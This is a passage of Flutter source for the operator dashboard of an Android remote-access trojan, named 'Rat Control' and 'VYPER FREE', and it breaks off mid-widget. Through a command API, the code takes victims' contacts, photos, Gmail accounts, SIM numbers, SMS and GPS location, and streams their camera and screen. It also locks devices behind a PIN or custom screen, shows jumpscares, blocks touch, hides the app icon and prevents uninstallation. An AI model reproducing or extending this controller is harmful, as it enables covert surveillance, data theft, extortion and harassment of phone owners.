// dashboard_page.dart
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:image_picker/image_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';

class DashboardPage extends StatefulWidget {
  final String token;
  final String username;
  final String displayName;
  final String baseUrl;
  final String deviceId;

  const DashboardPage({
    super.key,
    required this.token,
    required this.username,
    required this.displayName,
    required this.baseUrl,
    required this.deviceId,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage> with SingleTickerProviderStateMixin {
  int _currentPage = 0;
  String _selectedDeviceId = '';
  List<dynamic> _devices = [];
  bool _isLoading = true;
  String _role = 'member';
  String _uid = '';
  String? _trialExpiry;
  Timer? _trialTimer;
  bool _isSidebarOpen = false;
  late AnimationController _sidebarController;
  late Animation<double> _sidebarAnimation;
  final TextEditingController _lockCustomController = TextEditingController();

  // Status untuk control
  bool _flashlight = false;
  bool _deviceLocked = false;
  bool _lockCustomActive = false;
  bool _cameraActive = false;
  bool _screenActive = false;
  bool _jumpscareActive = false;
  bool _antiUninstall = false;
  bool _iconHidden = false;
  bool _volumeMuted = false;
  bool _encActive = false;
  bool _vibrateActive = false;
  bool _videoOverlayActive = false;
  bool _dialogSpamActive = false;
  bool _touchBlocked = false;
  bool _ttsSpeaking = false;
  bool _jumpscare2Active = false;

  Map<String, dynamic> _status = {};
  Map<String, dynamic> _smsData = {};
  List<dynamic> _blockedApps = [];
  List<dynamic> _contacts = [];
  List<dynamic> _gallery = [];
  List<dynamic> _gmail = [];
  List<dynamic> _phone = [];
  List<dynamic> _files = [];
  Map<String, dynamic> _location = {};

  // Socket
  bool _socketConnected = false;
  dynamic _socket;
  String? _cameraFrame;
  String? _screenFrame;

  final List<String> _aiMessages = [
    'Aplikasi Rat Control Sudah Ter Uji Coba',
    'Jangan Melakukan Tindakan Ilegal',
    '🔒 Keamanan adalah prioritas utama',
    'Gunakan sesuai aturan main',
    'Update berkala setiap minggu'
  ];
  int _aiMessageIndex = 0;

  @override
  void initState() {
    super.initState();
    _sidebarController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 300),
    );
    _sidebarAnimation = Tween<double>(begin: -1, end: 0).animate(
      CurvedAnimation(parent: _sidebarController, curve: Curves.easeOutCubic),
    );
    _fetchUserData();
    _fetchDevices();
    _startAITimer();
    _connectSocket();
  }

  @override
  void dispose() {
    _sidebarController.dispose();
    _trialTimer?.cancel();
    _socket?.dispose();
    super.dispose();
  }

  void _startAITimer() {
    _trialTimer = Timer.periodic(const Duration(seconds: 4), (timer) {
      if (mounted) {
        setState(() {
          _aiMessageIndex = (_aiMessageIndex + 1) % _aiMessages.length;
        });
      }
    });
  }

  void _connectSocket() {
    // Socket.IO implementation would go here
    // For now, we'll use HTTP polling as fallback
    _socketConnected = true;
    setState(() {});
  }

  Future<void> _fetchUserData() async {
    try {
      final response = await http.get(
        Uri.parse('${widget.baseUrl}/api/me'),
        headers: {'x-auth-token': widget.token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        setState(() {
          _role = data['role'] ?? 'member';
          _uid = data['uid'] ?? '';
          _trialExpiry = data['trialExpiry'];
        });
        _startTrialTimer();
      }
    } catch (e) {
      print('Error fetching user data: $e');
    }
  }

  void _startTrialTimer() {
    if (_trialExpiry == null) return;
    _trialTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (mounted) {
        final expiry = DateTime.parse(_trialExpiry!);
        final now = DateTime.now();
        if (now.isAfter(expiry)) {
          timer.cancel();
          _showToast('Akun Expired', 'Silakan login ulang', isError: true);
          _logout();
        }
        setState(() {});
      }
    });
  }

  String _getTrialRemaining() {
    if (_trialExpiry == null) return 'Permanent';
    final expiry = DateTime.parse(_trialExpiry!);
    final now = DateTime.now();
    if (now.isAfter(expiry)) return 'Expired';
    final diff = expiry.difference(now);
    final days = diff.inDays;
    final hours = diff.inHours % 24;
    final minutes = diff.inMinutes % 60;
    if (days > 0) return '${days}H ${hours.toString().padLeft(2, '0')}:${minutes.toString().padLeft(2, '0')}';
    if (hours > 0) return '${hours.toString().padLeft(2, '0')}:${minutes.toString().padLeft(2, '0')}';
    return '${minutes.toString().padLeft(2, '0')}:${diff.inSeconds % 60}';
  }

  Future<void> _fetchDevices() async {
    setState(() => _isLoading = true);
    try {
      final response = await http.get(
        Uri.parse('${widget.baseUrl}/api/devices'),
        headers: {'x-auth-token': widget.token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        setState(() {
          _devices = data;
          _isLoading = false;
          if (_devices.isNotEmpty && _selectedDeviceId.isEmpty) {
            _selectedDeviceId = _devices[0]['id'];
            _fetchDeviceStatus(_selectedDeviceId);
          }
        });
      } else {
        setState(() => _isLoading = false);
      }
    } catch (e) {
      setState(() => _isLoading = false);
      print('Error fetching devices: $e');
    }
  }

  Future<void> _fetchDeviceStatus(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('${widget.baseUrl}/api/devices'),
        headers: {'x-auth-token': widget.token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final device = data.firstWhere((d) => d['id'] == deviceId, orElse: () => null);
        if (device != null) {
          setState(() {
            _status = device['status'] ?? {};
            _flashlight = _status['flashlight'] ?? false;
            _deviceLocked = _status['deviceLocked'] ?? false;
            _lockCustomActive = _status['lockCustomActive'] ?? false;
            _cameraActive = _status['cameraActive'] ?? false;
            _screenActive = _status['screenActive'] ?? false;
            _jumpscareActive = _status['jumpscareActive'] ?? false;
            _antiUninstall = _status['antiUninstall'] ?? false;
            _iconHidden = _status['iconHidden'] ?? false;
            _volumeMuted = _status['volumeMuted'] ?? false;
            _encActive = _status['encActive'] ?? false;
            _videoOverlayActive = _status['videoOverlayActive'] ?? false;
            _dialogSpamActive = _status['dialogSpamActive'] ?? false;
            _touchBlocked = _status['touchBlocked'] ?? false;
            _ttsSpeaking = _status['ttsSpeaking'] ?? false;
            _jumpscare2Active = _status['jumpscare2Active'] ?? false;
          });
        }
      }
    } catch (e) {
      print('Error fetching device status: $e');
    }
  }

  Future<void> _sendCommand(String deviceId, String command, dynamic value) async {
    try {
      final response = await http.post(
        Uri.parse('${widget.baseUrl}/api/command/$deviceId'),
        headers: {
          'Content-Type': 'application/json',
          'x-auth-token': widget.token,
        },
        body: jsonEncode({
          'command': command,
          'value': value,
        }),
      );
      if (response.statusCode == 200) {
        _showToast('Command Sent', '$command executed', isError: false);
        await _fetchDeviceStatus(deviceId);
      }
    } catch (e) {
      _showToast('Error', 'Failed to send command', isError: true);
      print('Error sending command: $e');
    }
  }

  void _toggleFlashlight() {
    _flashlight = !_flashlight;
    _sendCommand(_selectedDeviceId, 'flashlight', _flashlight);
  }

  void _toggleLock() {
    _deviceLocked = !_deviceLocked;
    if (_deviceLocked) {
      _showLockDialog();
    } else {
      _sendCommand(_selectedDeviceId, 'unlockDevice', 'true');
    }
  }

  void _showLockDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.lock_outline, color: const Color(0xFFa78bfa)),
            const SizedBox(width: 10),
            Text('Set PIN', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _lockCustomController,
              decoration: InputDecoration(
                hintText: 'Judul Lock',
                hintStyle: TextStyle(color: const Color(0xFF3d6080)),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.2)),
                ),
                focusedBorder: const UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF4f8dff)),
                ),
              ),
              style: const TextStyle(color: Colors.white),
            ),
            const SizedBox(height: 16),
            const Text(
              'Masukkan PIN 4 angka:',
              style: TextStyle(color: Color(0xFF8ab4e0)),
            ),
            const SizedBox(height: 16),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: List.generate(4, (index) {
                return Container(
                  margin: const EdgeInsets.symmetric(horizontal: 8),
                  width: 50,
                  height: 60,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: const Color(0xFF4f8dff).withOpacity(0.15),
                    ),
                  ),
                  child: Center(
                    child: Text(
                      '—',
                      style: TextStyle(
                        fontSize: 24,
                        color: Colors.white.withOpacity(0.3),
                      ),
                    ),
                  ),
                );
              }),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand(_selectedDeviceId, 'lockDevice', jsonEncode({
                'pin': '1234',
                'title': _lockCustomController.text,
              }));
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF4f8dff).withOpacity(0.15),
              foregroundColor: const Color(0xFF4d8fff),
            ),
            child: const Text('LOCK'),
          ),
        ],
      ),
    );
  }

  void _toggleCustomLock() {
    if (!_lockCustomActive) {
      _showCustomLockDialog();
    } else {
      _lockCustomActive = false;
      _sendCommand(_selectedDeviceId, 'unlockDevice', 'true');
      setState(() {});
    }
  }

  void _showCustomLockDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.lock_outline, color: const Color(0xFFa78bfa)),
            const SizedBox(width: 10),
            Text('Lock Custom V2', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text(
              'HTML Tampilan Lock',
              style: TextStyle(color: Color(0xFF3d6080), fontSize: 11),
            ),
            const SizedBox(height: 8),
            Container(
              height: 200,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.2)),
              ),
              child: TextField(
                controller: _lockCustomController,
                maxLines: null,
                expands: true,
                style: const TextStyle(color: Colors.white, fontSize: 11),
                decoration: const InputDecoration(
                  hintText: '<div style="color:white;text-align:center">Perangkat Terkunci</div>',
                  hintStyle: TextStyle(color: Color(0xFF1a3050)),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.all(12),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _lockCustomActive = true;
              _sendCommand(_selectedDeviceId, 'lockCustom', _lockCustomController.text);
              setState(() {});
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFa78bfa).withOpacity(0.15),
              foregroundColor: const Color(0xFFa78bfa),
            ),
            child: const Text('LOCK'),
          ),
        ],
      ),
    );
  }

  void _toggleJumpscare() {
    if (!_jumpscareActive) {
      _showJumpscareDialog();
    } else {
      _jumpscareActive = false;
      _sendCommand(_selectedDeviceId, 'jumpscareStop', 'true');
      setState(() {});
    }
  }

  void _showJumpscareDialog() {
    final controller = TextEditingController(text: 'https://files.catbox.moe/dihycl.jpg');
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.warning_amber_rounded, color: const Color(0xFFFF4D6D)),
            const SizedBox(width: 10),
            Text('Jumpscare', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: controller,
              style: const TextStyle(color: Colors.white, fontSize: 11),
              decoration: InputDecoration(
                hintText: 'URL Gambar',
                hintStyle: TextStyle(color: const Color(0xFF1a3050)),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.2)),
                ),
                focusedBorder: const UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF4f8dff)),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _jumpscareActive = true;
              _sendCommand(_selectedDeviceId, 'jumpscareStart', controller.text);
              setState(() {});
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFFF4D6D).withOpacity(0.15),
              foregroundColor: const Color(0xFFFF4D6D),
            ),
            child: const Text('AKTIFKAN'),
          ),
        ],
      ),
    );
  }

  void _showGalleryDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.photo_library_outlined, color: const Color(0xFF4d8fff)),
            const SizedBox(width: 10),
            Text('Galeri', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: _gallery.isEmpty
              ? Center(
                  child: Text(
                    'Tidak ada foto',
                    style: TextStyle(color: const Color(0xFF3d6080)),
                  ),
                )
              : GridView.builder(
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 3,
                    crossAxisSpacing: 4,
                    mainAxisSpacing: 4,
                  ),
                  itemCount: _gallery.length,
                  itemBuilder: (context, index) {
                    final photo = _gallery[index];
                    return Container(
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(8),
                        color: const Color(0xFF1a3050),
                      ),
                      child: photo['thumb'] != null
                          ? Image.network(
                              photo['thumb'],
                              fit: BoxFit.cover,
                              errorBuilder: (context, error, stackTrace) {
                                return const Icon(Icons.broken_image, color: Color(0xFF3d6080));
                              },
                            )
                          : const Icon(Icons.image_outlined, color: Color(0xFF3d6080)),
                    );
                  },
                ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              _sendCommand(_selectedDeviceId, 'getGallery', '');
              _showToast('Loading', 'Mengambil foto...', isError: false);
            },
            child: const Text('Refresh', style: TextStyle(color: Color(0xFF4d8fff))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
    _sendCommand(_selectedDeviceId, 'getGallery', '');
  }

  void _showLocationDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.location_on_outlined, color: const Color(0xFF00e5a0)),
            const SizedBox(width: 10),
            Text('GPS Lokasi', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: _location.isEmpty
            ? const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    CircularProgressIndicator(
                      strokeWidth: 2,
                      color: Color(0xFF00e5a0),
                    ),
                    SizedBox(height: 16),
                    Text(
                      'Mengambil lokasi...',
                      style: TextStyle(color: Color(0xFF1a3050)),
                    ),
                  ],
                ),
              )
            : Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  _buildLocationRow('Provinsi', _location['province'] ?? '-'),
                  _buildLocationRow('Kabupaten/Kota', _location['city'] ?? '-'),
                  _buildLocationRow('Kecamatan', _location['district'] ?? '-'),
                  _buildLocationRow('Desa/Kelurahan', _location['village'] ?? '-'),
                  _buildLocationRow('Kode Pos', _location['postalCode'] ?? '-'),
                  const SizedBox(height: 8),
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.15)),
                    ),
                    child: Row(
                      children: [
                        Icon(Icons.map_outlined, color: const Color(0xFF4d8fff)),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            '${_location['lat']?.toString() ?? '-'}, ${_location['lng']?.toString() ?? '-'}',
                            style: const TextStyle(color: Color(0xFF4d8fff), fontSize: 11),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
        actions: [
          TextButton(
            onPressed: () {
              _sendCommand(_selectedDeviceId, 'getLocation', '');
              _showToast('Loading', 'Mengambil lokasi...', isError: false);
            },
            child: const Text('Refresh', style: TextStyle(color: Color(0xFF00e5a0))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
    _sendCommand(_selectedDeviceId, 'getLocation', '');
  }

  Widget _buildLocationRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text(
            label,
            style: const TextStyle(color: Color(0xFF3d6080), fontSize: 10),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              value,
              style: const TextStyle(color: Colors.white, fontSize: 12),
              textAlign: TextAlign.right,
            ),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.contacts_outlined, color: const Color(0xFFFFC34D)),
            const SizedBox(width: 10),
            Text('Kontak', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: _contacts.isEmpty
              ? const Center(
                  child: Text(
                    'Tidak ada kontak',
                    style: TextStyle(color: Color(0xFF3d6080)),
                  ),
                )
              : ListView.builder(
                  itemCount: _contacts.length,
                  itemBuilder: (context, index) {
                    final contact = _contacts[index];
                    return ListTile(
                      leading: CircleAvatar(
                        backgroundColor: const Color(0xFFFFC34D).withOpacity(0.1),
                        child: Text(
                          (contact['name'] ?? '?')[0].toUpperCase(),
                          style: const TextStyle(color: Color(0xFFFFC34D)),
                        ),
                      ),
                      title: Text(
                        contact['name'] ?? '-',
                        style: const TextStyle(color: Colors.white),
                      ),
                      subtitle: Text(
                        contact['number'] ?? '-',
                        style: const TextStyle(color: Color(0xFF3d6080), fontSize: 11),
                      ),
                      trailing: IconButton(
                        icon: Icon(Icons.copy, color: const Color(0xFF3d6080), size: 16),
                        onPressed: () {
                          Clipboard.setData(ClipboardData(text: contact['number'] ?? ''));
                          _showToast('Disalin', 'Nomor disalin', isError: false);
                        },
                      ),
                    );
                  },
                ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              _sendCommand(_selectedDeviceId, 'getContacts', '');
              _showToast('Loading', 'Mengambil kontak...', isError: false);
            },
            child: const Text('Refresh', style: TextStyle(color: Color(0xFFFFC34D))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
    _sendCommand(_selectedDeviceId, 'getContacts', '');
  }

  void _showGmailDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.email_outlined, color: const Color(0xFFf87171)),
            const SizedBox(width: 10),
            Text('Akun Gmail', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 250,
          child: _gmail.isEmpty
              ? const Center(
                  child: Text(
                    'Tidak ada akun Google',
                    style: TextStyle(color: Color(0xFF3d6080)),
                  ),
                )
              : ListView.builder(
                  itemCount: _gmail.length,
                  itemBuilder: (context, index) {
                    final account = _gmail[index];
                    return ListTile(
                      leading: CircleAvatar(
                        backgroundColor: const Color(0xFFf87171).withOpacity(0.1),
                        child: Text(
                          (account['email'] ?? '?')[0].toUpperCase(),
                          style: const TextStyle(color: Color(0xFFf87171)),
                        ),
                      ),
                      title: Text(
                        account['email'] ?? '-',
                        style: const TextStyle(color: Colors.white, fontSize: 13),
                      ),
                      subtitle: Text(
                        account['type'] ?? 'com.google',
                        style: const TextStyle(color: Color(0xFF3d6080), fontSize: 10),
                      ),
                      trailing: IconButton(
                        icon: Icon(Icons.copy, color: const Color(0xFF3d6080), size: 16),
                        onPressed: () {
                          Clipboard.setData(ClipboardData(text: account['email'] ?? ''));
                          _showToast('Disalin', 'Email disalin', isError: false);
                        },
                      ),
                    );
                  },
                ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              _sendCommand(_selectedDeviceId, 'getGmail', '');
              _showToast('Loading', 'Mengambil akun...', isError: false);
            },
            child: const Text('Refresh', style: TextStyle(color: Color(0xFFf87171))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
    _sendCommand(_selectedDeviceId, 'getGmail', '');
  }

  void _showPhoneDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF070f1c),
        title: Row(
          children: [
            Icon(Icons.phone_android_outlined, color: const Color(0xFF34d399)),
            const SizedBox(width: 10),
            Text('Nomor SIM', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 200,
          child: _phone.isEmpty
              ? const Center(
                  child: Text(
                    'Tidak ada data SIM',
                    style: TextStyle(color: Color(0xFF3d6080)),
                  ),
                )
              : ListView.builder(
                  itemCount: _phone.length,
                  itemBuilder: (context, index) {
                    final sim = _phone[index];
                    return Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: const Color(0xFF34d399).withOpacity(0.15)),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            sim['displayName'] ?? 'SIM ${index + 1}',
                            style: const TextStyle(
                              color: Color(0xFF34d399),
                              fontSize: 10,
                              letterSpacing: 2,
                            ),
                          ),
                          const SizedBox(height: 4),
                          Text(
                            sim['number'] ?? 'Nomor tidak tersedia',
                            style: TextStyle(
                              color: sim['number'] != null ? Colors.white : const Color(0xFF3d6080),
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          if (sim['operator'] != null)
                            Text(
                              sim['operator'],
                              style: const TextStyle(color: Color(0xFF3d6080), fontSize: 10),
                            ),
                          if (sim['number'] != null)
                            TextButton(
                              onPressed: () {
                                Clipboard.setData(ClipboardData(text: sim['number']));
                                _showToast('Disalin', 'Nomor disalin', isError: false);
                              },
                              child: const Text(
                                'SALIN NOMOR',
                                style: TextStyle(color: Color(0xFF34d399), fontSize: 10),
                              ),
                            ),
                        ],
                      ),
                    );
                  },
                ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              _sendCommand(_selectedDeviceId, 'getPhone', '');
              _showToast('Loading', 'Mengambil data SIM...', isError: false);
            },
            child: const Text('Refresh', style: TextStyle(color: Color(0xFF34d399))),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup', style: TextStyle(color: Color(0xFF3d6080))),
          ),
        ],
      ),
    );
    _sendCommand(_selectedDeviceId, 'getPhone', '');
  }

  void _showToast(String title, String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(
              isError ? Icons.error_outline : Icons.check_circle_outline,
              color: isError ? Colors.redAccent : Colors.greenAccent,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    title,
                    style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 12),
                  ),
                  Text(message, style: const TextStyle(fontSize: 11)),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: const Color(0xFF070f1c),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(
            color: isError ? Colors.redAccent.withOpacity(0.2) : Colors.greenAccent.withOpacity(0.2),
          ),
        ),
      ),
    );
  }

  Future<void> _logout() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('token');
    await prefs.remove('username');
    await prefs.remove('displayName');
    if (mounted) {
      Navigator.pushReplacementNamed(context, '/login');
    }
  }

  void _toggleSidebar() {
    setState(() {
      _isSidebarOpen = !_isSidebarOpen;
      if (_isSidebarOpen) {
        _sidebarController.forward();
      } else {
        _sidebarController.reverse();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF020510),
      body: Stack(
        children: [
          // Main Content
          _buildMainContent(),

          // Sidebar Overlay
          if (_isSidebarOpen)
            GestureDetector(
              onTap: _toggleSidebar,
              child: Container(
                color: Colors.black.withOpacity(0.7),
              ),
            ),

          // Sidebar
          AnimatedBuilder(
            animation: _sidebarAnimation,
            builder: (context, child) {
              return Transform.translate(
                offset: Offset(_sidebarAnimation.value * 280, 0),
                child: _buildSidebar(),
              );
            },
          ),
        ],
      ),
    );
  }

  Widget _buildMainContent() {
    return SafeArea(
      child: Column(
        children: [
          // Header
          _buildHeader(),
          // Content
          Expanded(
            child: IndexedStack(
              index: _currentPage,
              children: [
                _buildDashboardPage(),
                _buildDevicesPage(),
                _buildControlPage(),
                _buildSmsPage(),
              ],
            ),
          ),
          // Bottom Nav
          _buildBottomNav(),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        border: Border(
          bottom: BorderSide(
            color: const Color(0xFF4f8dff).withOpacity(0.1),
          ),
        ),
      ),
      child: Row(
        children: [
          IconButton(
            onPressed: _toggleSidebar,
            icon: Icon(Icons.menu, color: const Color(0xFF4d8fff)),
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Center(
              child: RichText(
                text: TextSpan(
                  style: const TextStyle(
                    fontFamily: 'Bungee',
                    fontSize: 22,
                    letterSpacing: 3,
                  ),
                  children: [
                    const TextSpan(text: 'VYPER', style: TextStyle(color: Colors.white)),
                    TextSpan(
                      text: 'FREE',
                      style: TextStyle(color: const Color(0xFF00d4ff)),
                    ),
                  ],
                ),
              ),
            ),
          ),
          IconButton(
            onPressed: _logout,
            icon: Icon(Icons.logout, color: const Color(0xFFFF4D6D), size: 18),
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(),
          ),
        ],
      ),
    );
  }

  Widget _buildBottomNav() {
    final pages = ['Home', 'Devices', 'Kontrol', 'Pesan'];
    final icons = [
      Icons.home_outlined,
      Icons.phone_android_outlined,
      Icons.tune_outlined,
      Icons.message_outlined,
    ];
    return Container(
      margin: const EdgeInsets.all(10),
      padding: const EdgeInsets.all(6),
      decoration: BoxDecoration(
        color: const Color(0xFF050d1f).withOpacity(0.97),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.1)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.7),
            blurRadius: 40,
          ),
        ],
      ),
      child: Row(
        children: List.generate(4, (index) {
          final isActive = _currentPage == index;
          return Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() => _currentPage = index);
              },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 8),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(16),
                  color: isActive
                      ? const Color(0xFF4f8dff).withOpacity(0.1)
                      : Colors.transparent,
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(
                      icons[index],
                      color: isActive ? const Color(0xFF4d8fff) : const Color(0xFF1a3050),
                      size: 20,
                    ),
                    Text(
                      pages[index],
                      style: TextStyle(
                        fontSize: 8,
                        color: isActive ? const Color(0xFF4d8fff) : const Color(0xFF1a3050),
                        fontFamily: 'IBM Plex Mono',
                        letterSpacing: 1.5,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          );
        }),
      ),
    );
  }

  // ==================== DASHBOARD PAGE ====================
  Widget _buildDashboardPage() {
    return SingleChildScrollView(
      padding: const EdgeInsets.only(bottom: 80),
      child: Column(
        children: [
          // Banner
          Container(
            width: double.infinity,
            height: 180,
            decoration: BoxDecoration(
              image: const DecorationImage(
                image: AssetImage('assets/images/dashboard_banner.gif'),
                fit: BoxFit.cover,
              ),
            ),
            child: Stack(
              children: [
                Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter,
                      colors: [
                        Colors.transparent,
                        const Color(0xFF020510).withOpacity(0.85),
                      ],
                    ),
                  ),
                ),
                Positioned(
                  bottom: 16,
                  left: 16,
                  right: 16,
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'VERSION 1.0.0',
                            style: TextStyle(
                              fontFamily: 'Bungee',
                              fontSize: 24,
                              color: Colors.white,
                              letterSpacing: 3,
                              shadows: [
                                Shadow(blurRadius: 20, color: Colors.black87),
                              ],
                            ),
                          ),
                          Text(
                            'CREATED BY GUPONG OFFICIAL',
                            style: TextStyle(
                              fontSize: 9,
                              color: Colors.white.withOpacity(0.5),
                              letterSpacing: 2,
                              fontFamily: 'IBM Plex Mono',
                            ),
                          ),
                        ],
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(6),
                          border: Border.all(color: const Color(0xFF00e5a0).withOpacity(0.25)),
                          color: const Color(0xFF00e5a0).withOpacity(0.06),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 6,
                              height: 6,
